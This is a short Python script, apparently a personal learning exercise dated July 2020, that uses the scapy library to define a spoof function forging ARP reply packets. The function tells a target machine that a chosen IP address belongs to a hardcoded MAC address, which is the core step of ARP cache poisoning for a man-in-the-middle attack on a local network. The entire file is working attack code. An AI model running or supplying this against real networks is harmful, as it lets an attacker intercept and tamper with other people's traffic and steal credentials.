#!/usr/bin/env python3
# @Author - Avish Dhirawat
# Date - 11 July 2020

import scapy.all as scapy

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = "08:00:27:e6:e5:59", psrc = spoof_ip)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet)
